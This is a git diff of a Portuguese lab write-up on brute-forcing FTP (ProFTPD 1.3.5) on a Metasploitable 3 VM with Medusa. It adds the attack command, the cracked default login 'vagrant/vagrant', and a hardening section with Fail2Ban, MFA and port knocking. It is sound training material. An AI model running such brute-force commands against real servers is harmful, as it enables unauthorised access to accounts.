@@ -14,8 +14,6 @@ O objetivo foi testar a resiliência do protocolo **FTP (ProFTPD 1.3.5)** contra
 * **Atacante:** Kali Linux (Medusa v2.3)
 * **Alvo:** Metasploitable 3 (Ubuntu 14.04)
 * **Protocolo:** FTP (Porta 21)
-<img width="1584" height="386" alt="Captura de tela de 2026-05-15 17-40-38" src="https://github.com/user-attachments/assets/b10d1207-7d74-4388-bcda-dade17926e82" />
-
 ---
 
 ## ⚡ Execução do Protocolo
@@ -33,5 +31,37 @@ O comando utilizado para iniciar a força bruta modular foi:
 
 ```bash
 medusa -h 192.168.1.97 -u users.txt -P pass.txt -M ftp
+```
+Resultados da Operação
+A engine identificou a credencial vulnerável em poucos segundos de execução:
 
-![Uploading Captura de tela de 2026-05-15 17-40-38.png…]()
+HOST: 192.168.1.97,
+
+USER: vagrant,
+
+PASS: vagrant,
+
+STATUS: [SUCCESS]
+
+---
+
+## 🛑 Protocolos de Hardening (Medidas de Defesa)
+> "A melhor defesa é uma arquitetura que não oferece confiança a ninguém."
+
+Para mitigar a eficácia de ataques como a **Operation-BruteForce**, as seguintes camadas de segurança devem ser implementadas no servidor alvo:
+
+### 1. Camadas de Proteção Ativa
+| Defesa | Implementação Técnica | Objetivo |
+| :--- | :--- | :--- |
+| **Intrusion Prevention** | Instalação e configuração do **Fail2Ban** para monitorar logs do serviço FTP. | Banir automaticamente o IP do atacante após 3 tentativas falhas. |
+| **Identity Management** | Implementação de **MFA (2FA)** via módulos PAM. | Tornar a senha insuficiente para o acesso, exigindo um token temporário. |
+| **Access Control** | Edição do arquivo `/etc/proftpd/proftpd.conf` para desabilitar o login de `root`. | Impedir que contas administrativas sejam alvos de força bruta direta. |
+
+### 2. Fortalecimento de Infraestrutura
+* **Substituição de Senhas por Chaves:** Desabilitar a autenticação por senha e permitir apenas chaves SSH/RSA de no mínimo **4096 bits**.
+* **Port Knocking:** Configurar o firewall para manter a porta 21 oculta, abrindo-a apenas após uma "batida" específica em outras portas pré-definidas.
+* **Monitoramento de Logs:** Centralizar logs em um servidor externo para identificar padrões de varredura (Reconnaissance) antes mesmo do ataque começar.
+
+---
+**Status da Operação:** Concluída com sucesso.  
+**Recomendação:** Aplicar Hardening imediato no ambiente Metasploitable 3.
